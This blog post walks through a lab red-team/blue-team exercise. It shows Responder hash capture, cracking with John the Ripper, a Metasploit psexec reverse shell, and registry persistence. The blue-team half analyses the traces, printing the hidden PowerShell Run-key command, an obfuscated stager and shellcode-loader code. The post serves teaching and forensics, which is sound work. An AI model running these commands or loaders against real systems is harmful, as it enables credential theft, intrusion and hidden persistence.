---
layout: post
title: Red and Blue Team Insights, Unpacking the Attack Chain
date: '2023-09-22 8:24:12 +0400'
categories: [Threat Hunting]
tags: [Pentest,Registry,MSF,Responder,Persistence,Powershell,Forensics,Obfuscation,Shellcode]
---
# Red and Blue Team Insights: Unpacking the Attack Chain

Hello again,

Today I am taking on the dual roles of attacker and defender in a simulated Windows environment, That's a fascinating approach to understanding both the offensive and defensive sides of cybersecurity.

![CS](/assets/1.png)

In this article, I will first begin with an initial breach leveraging Responder to capture user hashes during network interactions. Following that, using a simple Metasploit Framework (MSF) PSExec attack, Subsequently, we will explore methods for establishing persistence through the Windows Registry then I will examine the registry traces left behind by such an attack, (IOCs) indicators of compromise that could serve as clues for our Blue Teamers' investigation.

### Tools of the Trade: Unveiling the Arsenal

### Responder: Capturing User Hashes

**The Stealthy Tool for Hash Capture**

- **What it does**: Responder is a network tool designed to capture user hashes during network interactions. It takes advantage of the way Windows clients automatically attempt to authenticate with various services, such as SMB and HTTP, when encountering unfamiliar hostnames.
- **Role in Attack Chain**: Responder is primarily used for reconnaissance and obtaining user credentials. When placed on an internal network, it listens for broadcast queries and responds to them, tricking Windows clients into revealing their authentication information, including NetNTLM hashes.

### MSF PSExec Attack: The Initial Breach

**The Crafty Tool for Lateral Movement**

- **What it does**: PSExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software.
- **Role in Attack Chain**: Often used for lateral movement within a network. Once an attacker gains initial access to a network, they may use PSExec to move onto other systems.

### Metasploit Framework (MSF)

**The Magical Spellbook of Exploits**

- **What it does**: MSF is a penetration testing software that helps in identifying security vulnerabilities in systems.
- **Role in Attack Chain**: This tool can be used to maintain access to a system by exploiting known vulnerabilities, executing payloads, and conducting other post-exploitation activities.

### Phase I: Initiating the attack

In many of my penetration testing engagements, when I gain access to an internal network, Responder becomes a valuable asset for efficiently and discreetly acquiring user hashes from systems that respond to the broadcast services. These hashes can subsequently be subjected to cracking using the tool of your preference. As the name "Responder" suggests, this script actively responds to broadcast messages generated when a Windows client requests information about a hostname not listed in the local network's DNS tables.

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# responder -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> <https://www.patreon.com/PythonResponder>
  Paypal  -> <https://paypal.me/PythonResponder>

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.211]
    Responder IPv6             [fe80::f852:5158:7436:1d46]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-E12345678Y]
    Responder Domain Name      [Test.LOCAL]
    Responder DCE-RPC Port     [47622]

[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 192.168.1.214 for name share
[*] [LLMNR]  Poisoned answer sent to 192.168.1.214 for name share
[*] [LLMNR]  Poisoned answer sent to 192.168.1.214 for name share
[*] [LLMNR]  Poisoned answer sent to 192.168.1.214 for name share
[*] [LLMNR]  Poisoned answer sent to 192.168.1.214 for name share
[WebDAV] NTLMv2 Client   : fe80::35be:97bc:49a7:a268
[WebDAV] NTLMv2 Username : IEWIN7\\IEUser
[WebDAV] NTLMv2 Hash     : IEUser::IEWIN7:a6f270fa9fdeec1e:4368FEEA0F5A318BBBA0C4A05817516D:0101000000000000ACF19878DFECD901A853AC573130C5E50000000002000800360054004E00310001001E00570049004E002D0045004F003400560044003600330036004C004200590004001400360054004E0031002E004C004F00430041004C0003003400570049004E002D0045004F003400560044003600330036004C00420059002E00360054004E0031002E004C004F00430041004C0005001400360054004E0031002E004C004F00430041004C000800300030000000000000000000000000300000E487B01429916BF389B06979E25E64C26DA752889CBEB3A7E52772117C870D5E0A001000000000000000000000000000000000000900140048005400540050002F00730068006100720065000000000000000000

[*] [LLMNR]  Poisoned answer sent to 192.168.1.214 for name share
[*] [LLMNR]  Poisoned answer sent to 192.168.1.214 for name share
[+] Exiting...

```

Afterwards, I stored the hash in a new file and employed the "John the Ripper" tool to effectively decrypt a password hash.

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd!        (IEUser)

```

With valid credentials in hand, I transitioned to MSF. Initially, I configured the attack parameters, specifying the target's IP address. The exploit then made its move, attempting to connect to the target system. Authentication succeeded using the 'ieuser' username and 'Passw0rd!' password, leading to the execution of the payload. This successful execution resulted in the establishment of a Meterpreter session, effectively granting me control over the target.

```bash
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                192.168.1.213    yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html>
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass               Passw0rd!        no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBUser               ieuser           no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.211    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 192.168.1.211:4444
[*] 192.168.1.213:445 - Connecting to the server...
[*] 192.168.1.213:445 - Authenticating to 192.168.1.213:445 as user 'ieuser'...
[*] 192.168.1.213:445 - Selecting PowerShell target
[*] 192.168.1.213:445 - Executing the payload...
[+] 192.168.1.213:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 192.168.1.213
[*] Meterpreter session 4 opened (192.168.1.211:4444 -> 192.168.1.213:49202) at 2023-09-21 08:18:38 -0400

```

In the Metasploit session, after backgrounding the initial Meterpreter session, I proceeded to set up registry persistence on the compromised target.

```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/psexec) > use exploit/windows/local/registry_persistence
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/registry_persistence) > set session 1
session => 1
msf6 exploit(windows/local/registry_persistence) > exploit

[*] Generating payload blob..
[+] Generated payload, 6812 bytes
[*] Root path is HKCU
[*] Installing payload blob..
[+] Created registry key HKCU\\Software\\QDowQPfr
[+] Installed payload blob to HKCU\\Software\\QDowQPfr\\jXlJkbvm
[*] Installing run key
[+] Installed run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\pcWt5LXY
[*] Clean up Meterpreter RC file: /home/kali/.msf4/logs/persistence/192.168.1.213_20230921.1920/192.168.1.213_20230921.1920.rc

```

I have concluded the attack scenario, and I will now proceed to provide a comprehensive explanation of all the analysis activities conducted on the target system.

### Phase II: Investigating the attack (Quit long process :D )

This phase involves activities by the Blue Team to detect, analyze, and mitigate the attack

As both the attacker and defender in this scenario, I have proactively installed a range of analysis tools on the target system. These tools include Process Hacker, Regshot, along with various other forensics and monitoring tools. In addition to these third-party tools, I also have access to Windows' built-in utilities such as Event Viewer and PowerShell. This comprehensive toolkit equips me to thoroughly analyze and assess the target system from both offensive and defensive perspectives

### Tools for Analysis: Unveiling the Insights

### Regshot: Monitoring System Changes

**The Snapshot Tool for System Analysis**

- **What it does**: Regshot is a system monitoring tool that captures snapshots of the Windows Registry and file system before and after specific actions. It helps detect changes made to the system configuration, such as file additions, deletions, or registry modifications.
- **Role in Analysis**: Regshot plays a crucial role in post-incident analysis and system forensics. By comparing snapshots, it aids in identifying alterations to the system that may indicate malicious activity or unauthorized changes.

### Regshot Analysis

![CS](/assets/2.png)

By using Regshot to capture snapshots of the file system and Windows Registry before and after the attack, you can effectively identify and analyze system changes. These changes may include alterations to files, directories, and registry entries, which are critical indicators of malicious activity or unauthorized modifications. The comparison of the pre-attack and post-attack snapshots allows you to pinpoint exactly what changed during the attack, helping you understand the impact and scope of the security incident. It's a valuable technique for incident response, forensics, and identifying potential vulnerabilities that attackers may have exploited.

![CS](/assets/3.png)

In the comparison output between the pre-attack and post-attack Regshot snapshots, several changes were detected in the Windows Registry. These changes include the addition of registry keys and values:

**Keys Added (2):**

1. HKU.DEFAULT\Software\5IBnjsmP
2. HKU\S-1-5-18\Software\5IBnjsmP

**Values Added (4):**

```
HKU.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\kgRuBzlE: "%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c "sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKCU:Software\\5IBnjsmP').GetValue('WhZrCF6T'))))""

```

These changes in the Windows Registry are indicative of the attacker's actions, which include adding a new registry key and associated values under both the ".DEFAULT" and "S-1-5-18" user profiles. The added value under "HKU.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run\kgRuBzlE" appears to execute a PowerShell command that decodes and runs a Base64-encoded payload from the registry key 'HKCU:Software\5IBnjsmP' using the 'iex' (Invoke-Expression) command.

We can use [CyberChef](https://t.ly/4kr9t) to decode it

![CS](/assets/4.png)

Now, let's dig into the code and demystify it. While it may seem confusing at first, we'll break it down step by step, following a structured approach to understand each line's purpose.

To begin, let's focus on the following line of PowerShell code:

```powershell
if([IntPtr]::Size -eq 4){$b='powershell.exe'}

```

This code dynamically determines the PowerShell path based on the system's architecture. This `if` statement assesses whether the size of the "integer pointer" data type is equivalent to the number 4.

In a 64-bit computer, the `IntPtr` size is 8, representing the length of memory addresses. Conversely, a 32-bit system features an `IntPtr` size of 4.

The variable `$b` is introduced as a PowerShell variable to store the path to the PowerShell executable.

Following this `if` statement, we encounter the subsequent portion of the code:

```powershell
$s = New-Object System.Diagnostics.ProcessStartInfo;
$s.FileName = $b;
$s.Arguments='-noni -nop -w hidden -c

```

Next, we encounter the code that creates another PowerShell variable named `$s`. In this instance, `$s` is defined as a new object of the `System.Diagnostics.ProcessStartInfo` class. This object represents the configuration settings for a new process. Within this object, the `FileName` property is set to `$b`, which we've established as the path to the PowerShell executable. Additionally, the `Arguments` property is set to include various PowerShell command-line arguments, such as `-noni`, `-nop`, `-w hidden`, and `-c`. As before, this code initiates a new instance of PowerShell, devoid of a profile, and concealed from view within a hidden window.

```powershell
&([scriptblock]::create((
	New-Object IO.StreamReader(
		New-Object IO.Compression.GzipStream((
			New-Object IO.MemoryStream(,
				[Convert]::FromBase64String(
					''...BASE64GZIPDATA...''
))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))

```

The `[scriptblock]::create` call is used to define a new block of code to execute. Within this code block, we have a series of functions that work together to process data.

- `New-Object IO.StreamReader` is used to read data on-the-fly.
- The data being read is wrapped in functions like `IO.Compression.GzipStream`, `IO.MemoryStream`, and `[Convert]::FromBase64String`.
- The `GzipStream` function is configured with a `Decompress` flag, indicating that the data is GZIP-compressed.

This complex arrangement suggests that the seemingly nonsensical and gibberish characters are, in fact, Base64-encoded GZIP-compressed data.

Base64 is an encoding method that represents data in a different format. To decode the data, you reverse the encoding process. GZIP, on the other hand, is a compression method used for archiving data, similar to a .ZIP file. Fortunately, we can reverse these operations on the large chunk of data to reveal its true purpose and contents.

```powershell
$s.UseShellExecute=$false;
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;

```

these  above settings collectively make sure that the new PowerShell instance operates stealthily, without revealing its presence to the user.

```powershell
$p=[System.Diagnostics.Process]::Start($s)

```

This line initiates the execution of our newly configured process, which contains the decoded and uncompressed code within the Base64 blob.

```
''H4sI{0}Es1DGUC{0}7VWbW/aSBD+Xqn/waqQbEsEzMu1TaRKZ0MMBEwg5iV{0}0cmxB9iw9{1}J7DeF6/e83i+1{0}L0kvd1JXQuzLzOzsM8/MeBEHLicskNbDj79J396/k9LRc0LHl5TcqtGFbV7Kxat68K{0}ez3P3P''+''emLpMz0za''+''bOfIcE84uLW{1}yGEPBkXWg{0}16MI/DtKIFJU6S9pvIIQzq7v7sHl0jcp90e{1}QdmdQ1Oxfc1xVyCd6YEnzjrMdYRrBXtDCVfkr19ldXZWm{1}cuH2KHRops7yMOfsGjVFal76q4cLDfgCJbx{0}1ZxBa8MCZBpVwYBpGzgC5a24IFfMW8SManHB8T{0}o/DQLxJGElEFBmnvZC5uueFEEVyXpoJ87P5/Hdllt59Ewec+FBoBRxCtrE{1}3BIXokLTCTwKN7CYo5bNQxIs''+''56qKYlu2BiUXxJTmp''+''f9iRunCLkPurUrKqRJK9Xio5jGkz15pMS+mkOjJL7iZkEDF8UQE{1}O+7QHCR8Werf3qcvECg40Y2ZocTQKeVHovIQfuLpOUlCx1wO{0}v3uMwNw{1}jU+RPkUs5f9PNvNVbKNFEvbuPGbMSINz+q/xD9XLg17oTQ61yuw4IEUN8Hjk/cjK7KS0GBBYUDIoVMrIv+KXJ6{0}F4dKCwdLo{0}W3HimdukT/qRrxIR6EOouBjZCrzDm6o/OJLFT5FZggY/YJWska26BSQKZdJoY++x2sUY{1}uUadKMpLvRiz1M1LNjgUvLykBxFJj/SYs8NUPrprxZQT14l4Zm6u/gPO9NoaCyIexi''+''5GFSEY2BtwiUMFInmpSTww9jZZZtfLL+JRcyjF9EFLW4wH7ggcbC''+''64EqKng{1}d''+''qwQbe8jcUfBQ5F{0}2TOkssEWmOHLjlLMGTX/EzS4aE+QKYDJE''+''TLzHaNmU8L41IyLEECZDj9v''+''9x4XnlOf{1}SCyENjZLl18zYc8H/HEwFQ1N4DmCEHIEwQ+YbTgQfq0mVUT4Ur0lPxzGpN20CozUptXb4s/{0}3rH/y2leM79v1ZtFya1GvYX7WyW65cz93dde78uDcRrn+qMprPb3ZJ5pRXbmGNsD5sMVbjRaft''+''PTmYOVSrYc27EmkkV''+''1zbLl1489dOUKeVqvNW02vVKrXFW2N0E1Ia''+''bnWva5Pdo8dnGM5ve4YrcjQWvTy''+''qnZzNy6b0zFtFqvmajFmkf1xUi8Wi+eeU7f2um4wr2Ltb0s3bNB0faM''+''asOJ5rbrWL3W9FlyOTIO1J0ao94ojZ7l{1}u/bS0MrLmm6YLoFpf2ga/b5p6MPG/UP9vLgsno9vnZUxHpXJdHN7s8K1uWv2raJWbXnwyD53xmS0FbaMB8Oc3jp6Z7o3i8XSJCo7a4PpBgJrT{1}/0xmqyMXsU9QfDMtNHtHuU7TfrbXda+{1}RZXz5gGGdDEvBKeZ6790SZe/8uB/frzugkmq8Vc''+''ssJo5VDMcpYo7NMM1lopjW3x4jQUJRD715DG{0}DFbof9MGOoTilzRc1PqjM2nKQNiK40bB3c''+''emmmSk+C6rEdZFsXF1N0E2kP00IHgiVf5bXHiqZ{1}BdceteqB3m9/Wo1t9gqayosOkECTmKYH02iNLCRF+fVYYavnWHJ+gtZrwOHla6wRWLOS1BXwGYzRU/Cylz2x4QgeolbCt89Em0eSoPoZPEg5L{1}rgaUPNReda/dfSJi1{0}K/zz/pU2x7''+''2fnL''+''6JSlo+{1}efZ/o''+''8bJ8X7F4Iwdg{1}HSRurKYWku7+CRZotJ1EWIcJsWKRDfPRex/ysix9S{1}4L+N1QEzEJvCw{0}{0}''

```

The primary concern here is the presence of curly brackets {} containing numbers followed by the `-f 'A','h'` construct.

This is a recognized obfuscation technique known as "Reordering." The `-f` formatting operator divides the string into segments and then reorders them based on the numeric values within the curly brackets.

For instance, consider the following example:

```powershell
PS C:\\Users\\condor> ("{1}{0}{2}" -f 'is','My name ',' egycondor')
My name is egycondor

```

If we try to decode it without reordering, it will appear as gibberish in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=SDRzSXswfUVzMURHVUN7MH03VldiVy9hU0JEK1hxbi93YXFRYkVzRXpNdTFUYVJLWjBNTUJFd2c1aVZ7MH0wY214Qjlpdzl7MX1KN0RlRjYvZTgzaSsxezB9TDBrdmQxSlhRdXpMek96c004L01lQkVITGljc2tOYkRqNzlKMzk2L2s5TFJjMExIbDVUY3F0R0ZiVjdLeGF0NjhLezB9ZXozUDNQJycrJydlbUxwTXowemEnJysnJ2JPZkljRTg0dUxXezF9eUdFUEJrWFdnezB9MTZNSS9EdEtJRkpVNlM5cHZJSVF6cTd2N3NIbDBqY3A5MGV7MX1RZG1kUTFPeGZjMXhWeUNkNllFbnpqck1kWVJyQlh0RENWZmtyMTlsZFhaV217MX1jdUgyS0hSb3BzN3lNT2ZzR2pWRmFsNzZxNGNMRGZnQ0pieHswfTFaeEJhOE1DWkJwVndZQnBHemdDNWEyNElGZk1XOFNNYW5IQjhUezB9by9EUUx4SkdFbEVGQm1udlpDNXV1ZUZFRVZ5WHBvSjg3UDUvSGRsbHQ1OUV3ZWMrRkJvQlJ4Q3RyRXsxfTNCSVhva0xUQ1R3S043Q1lvNWJOUXhJcycnKycnNTZxS1lsdTJCaVVYeEpUbXAnJysnJ2Y5aVJ1bkNMa1B1clVyS3FSSks5WGlvNWpHa3oxNXBNUytta09qSkw3aVprRURGOFVRRXsxfU8rN1FIQ1I4V2VyZjNxY3ZFQ2c0MFkyWm9jVFFLZVZIb3ZJUWZ1THBPVWxDeDF3T3swfXYzdU13Tnd7MX1qVStSUGtVczVmOVBOdk5WYktORkV2YnVQR2JNU0lOeitxL3hEOVhMZzE3b1RRNjF5dXc0SUVVTjhIamsvY2pLN0tTMEdCQllVRElvVk1ySXYrS1hKNnswfUY0ZEtDd2RMb3swfVczSGltZHVrVC9xUnJ4SVI2RU9vdUJqWkNyekRtNm8vT0pMRlQ1RlpnZ1kvWUpXc2thMjZCU1FLWmRKb1krK3gyc1VZezF9dVVhZEtNcEx2Uml6MU0xTE5qZ1V2THlrQnhGSmovU1lzOE5VUHJwcnhaUVQxNGw0Wm02dS9nUE85Tm9hQ3lJZXhpJycrJyc1R0ZTRVkyQnR3aVVNRklubXBTVHd3OWpaWlp0ZkxMK0pSY3lqRjlFRkxXNHdIN2dnY2JDJycrJyc2NEVxS25nezF9ZCcnKycncXdRYmU4amNVZkJRNUZ7MH0yVE9rc3NFV21PSExqbExNR1RYL0V6UzRhRStRS1lESkUnJysnJ1RMekhhTm1VOEw0MUl5TEVFQ1pEajl2JycrJyc5eDRYbmxPZnsxfVNDeUVOalpMbDE4elljOEgvSEV3RlExTjREbUNFSElFd1ErWWJUZ1FmcTBtVlVUNFVyMGxQeHpHcE4yMENvelVwdFhiNHMvezB9M3JIL3kybGVNNzl2MVp0RnlhMUd2WVg3V3lXNjVjejkzZGRlNzh1RGNScm4rcU1wclBiM1pKNXBSWGJtR05zRDVzTVZialJhZnQnJysnJ1BUbVlPVlNyWWMyN0Vta2tWJycrJycxemJMbDE0ODlkT1VLZVZxdk5XMDJ2VktyWEZXMk4wRTFJYScnKycnYm5XdmE1UGRvOGRuR001dmU0WXJjalFXdlR5JycrJydxblp6Tnk2YjB6RnRGcXZtYWpGbWtmMXhVaThXaStlZVU3ZjJ1bTR3cjJMdGIwczNiTkIwZmFNJycrJydhc09KNXJicldMM1c5Rmx5T1RJTzFKMGFvOTRvalo3bHsxfXUvYlMwTXJMbW02WUxvRnBmMmdhL2I1cDZNUEcvVVA5dkxnc25vOXZuWlV4SHBYSmRITjdzOEsxdVd2MnJhSldiWG53eUQ1M3htUzBGYmFNQjhPYzNqcDZaN28zaThYU0pDbzdhNFBwQmdKclR7MX0vMHhtcXlNWHNVOVFmRE10Tkh0SHVVN1RmcmJYZGErezF9UlpYejVnR0dkREV2QktlWjY3OTBTWmUvOHVCL2ZyenVna21xOFZjJycrJydzc0pvNVZETWNwWW83Tk1NMWxvcGpXM3g0alFVSlJENzE1REd7MH1ERmJvZjlNR09vVGlselJjMVBxak0ybktRTmlLNDBiQjNjJycrJydlbW1tU2srQzZyRWRaRnNYRjFOMEUya1AwMElIZ2lWZjViWEhpcVp7MX1CZGNldGVxQjNtOS9XbzF0OWdxYXlvc09rRUNUbUtZSDAyaU5MQ1JGK2ZWWVlhdm5XSEorZ3RacndPSGxhNndSV0xPUzFCWHdHWXpSVS9DeWx6Mng0UWdlb2xiQ3Q4OUVtMGVTb1BvWlBFZzVMezF9cmdhVVBOUmVkYS9kZlNKaTF7MH1LL3p6L3BVMng3JycrJycyZm5MJycrJyc2SlNsbyt7MX1lZlovbycnKycnOGJKOFg3RjRJd2RnezF9SFNSdXJLWVdrdTcrQ1Jab3RKMUVXSWNKc1dLUkRmUFJleC95c2l4OVN7MX00TCtOMVFFekVKdkN3ezB9ezB9)

However, we can easily use CyberChef's Find and Replace feature, powered by regex, to eliminate the pattern and remove any unnecessary strings.

This allows us to then perform the reverse operations using [CyberChef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'%7B0%7D'%7D,'A',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%7B1%7D'%7D,'h',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%5C'%5C'%2B%5C'%5C''%7D,'',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=SDRzSXswfUVzMURHVUN7MH03VldiVy9hU0JEK1hxbi93YXFRYkVzRXpNdTFUYVJLWjBNTUJFd2c1aVZ7MH0wY214Qjlpdzl7MX1KN0RlRjYvZTgzaSsxezB9TDBrdmQxSlhRdXpMek96c004L01lQkVITGljc2tOYkRqNzlKMzk2L2s5TFJjMExIbDVUY3F0R0ZiVjdLeGF0NjhLezB9ZXozUDNQJycrJydlbUxwTXowemEnJysnJ2JPZkljRTg0dUxXezF9eUdFUEJrWFdnezB9MTZNSS9EdEtJRkpVNlM5cHZJSVF6cTd2N3NIbDBqY3A5MGV7MX1RZG1kUTFPeGZjMXhWeUNkNllFbnpqck1kWVJyQlh0RENWZmtyMTlsZFhaV217MX1jdUgyS0hSb3BzN3lNT2ZzR2pWRmFsNzZxNGNMRGZnQ0pieHswfTFaeEJhOE1DWkJwVndZQnBHemdDNWEyNElGZk1XOFNNYW5IQjhUezB9by9EUUx4SkdFbEVGQm1udlpDNXV1ZUZFRVZ5WHBvSjg3UDUvSGRsbHQ1OUV3ZWMrRkJvQlJ4Q3RyRXsxfTNCSVhva0xUQ1R3S043Q1lvNWJOUXhJcycnKycnNTZxS1lsdTJCaVVYeEpUbXAnJysnJ2Y5aVJ1bkNMa1B1clVyS3FSSks5WGlvNWpHa3oxNXBNUytta09qSkw3aVprRURGOFVRRXsxfU8rN1FIQ1I4V2VyZjNxY3ZFQ2c0MFkyWm9jVFFLZVZIb3ZJUWZ1THBPVWxDeDF3T3swfXYzdU13Tnd7MX1qVStSUGtVczVmOVBOdk5WYktORkV2YnVQR2JNU0lOeitxL3hEOVhMZzE3b1RRNjF5dXc0SUVVTjhIamsvY2pLN0tTMEdCQllVRElvVk1ySXYrS1hKNnswfUY0ZEtDd2RMb3swfVczSGltZHVrVC9xUnJ4SVI2RU9vdUJqWkNyekRtNm8vT0pMRlQ1RlpnZ1kvWUpXc2thMjZCU1FLWmRKb1krK3gyc1VZezF9dVVhZEtNcEx2Uml6MU0xTE5qZ1V2THlrQnhGSmovU1lzOE5VUHJwcnhaUVQxNGw0Wm02dS9nUE85Tm9hQ3lJZXhpJycrJyc1R0ZTRVkyQnR3aVVNRklubXBTVHd3OWpaWlp0ZkxMK0pSY3lqRjlFRkxXNHdIN2dnY2JDJycrJyc2NEVxS25nezF9ZCcnKycncXdRYmU4amNVZkJRNUZ7MH0yVE9rc3NFV21PSExqbExNR1RYL0V6UzRhRStRS1lESkUnJysnJ1RMekhhTm1VOEw0MUl5TEVFQ1pEajl2JycrJyc5eDRYbmxPZnsxfVNDeUVOalpMbDE4elljOEgvSEV3RlExTjREbUNFSElFd1ErWWJUZ1FmcTBtVlVUNFVyMGxQeHpHcE4yMENvelVwdFhiNHMvezB9M3JIL3kybGVNNzl2MVp0RnlhMUd2WVg3V3lXNjVjejkzZGRlNzh1RGNScm4rcU1wclBiM1pKNXBSWGJtR05zRDVzTVZialJhZnQnJysnJ1BUbVlPVlNyWWMyN0Vta2tWJycrJycxemJMbDE0ODlkT1VLZVZxdk5XMDJ2VktyWEZXMk4wRTFJYScnKycnYm5XdmE1UGRvOGRuR001dmU0WXJjalFXdlR5JycrJydxblp6Tnk2YjB6RnRGcXZtYWpGbWtmMXhVaThXaStlZVU3ZjJ1bTR3cjJMdGIwczNiTkIwZmFNJycrJydhc09KNXJicldMM1c5Rmx5T1RJTzFKMGFvOTRvalo3bHsxfXUvYlMwTXJMbW02WUxvRnBmMmdhL2I1cDZNUEcvVVA5dkxnc25vOXZuWlV4SHBYSmRITjdzOEsxdVd2MnJhSldiWG53eUQ1M3htUzBGYmFNQjhPYzNqcDZaN28zaThYU0pDbzdhNFBwQmdKclR7MX0vMHhtcXlNWHNVOVFmRE10Tkh0SHVVN1RmcmJYZGErezF9UlpYejVnR0dkREV2QktlWjY3OTBTWmUvOHVCL2ZyenVna21xOFZjJycrJydzc0pvNVZETWNwWW83Tk1NMWxvcGpXM3g0alFVSlJENzE1REd7MH1ERmJvZjlNR09vVGlselJjMVBxak0ybktRTmlLNDBiQjNjJycrJydlbW1tU2srQzZyRWRaRnNYRjFOMEUya1AwMElIZ2lWZjViWEhpcVp7MX1CZGNldGVxQjNtOS9XbzF0OWdxYXlvc09rRUNUbUtZSDAyaU5MQ1JGK2ZWWVlhdm5XSEorZ3RacndPSGxhNndSV0xPUzFCWHdHWXpSVS9DeWx6Mng0UWdlb2xiQ3Q4OUVtMGVTb1BvWlBFZzVMezF9cmdhVVBOUmVkYS9kZlNKaTF7MH1LL3p6L3BVMng3JycrJycyZm5MJycrJyc2SlNsbyt7MX1lZlovbycnKycnOGJKOFg3RjRJd2RnezF9SFNSdXJLWVdrdTcrQ1Jab3RKMUVXSWNKc1dLUkRmUFJleC95c2l4OVN7MX00TCtOMVFFekVKdkN3ezB9ezB9).

This brings us back more PowerShell code 🧐 `OOOh Noooo OOOh Noooo OOOh Noooo Noooo Noooo Noooo` Music in the background

```powershell
function kU65 {
        Param ($hGNev, $uhDnq)
        $jP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $jP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jP.GetMethod('GetModuleHandle')).Invoke($null, @($hGNev)))), $uhDnq))
}

function vA7xY {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $mfQ,
                [Parameter(Position = 1)] [Type] $uK = [Void]
        )

        $rvBb = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $rvBb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mfQ).SetImplementationFlags('Runtime, Managed')
        $rvBb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uK, $mfQ).SetImplementationFlags('Runtime, Managed')

        return $rvBb.CreateType()
}

[Byte[]]$eZ = [System.Convert]::FromBase64String("/OiPAAAAYyF/................................./1QHDKcZ17sM=")
[Uint32]$jd = 0
$ejkLV = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kU65 kernel32.dll VirtualAlloc), (vA7xY @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $eZ.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($eZ, 0, $ejkLV, $eZ.length)
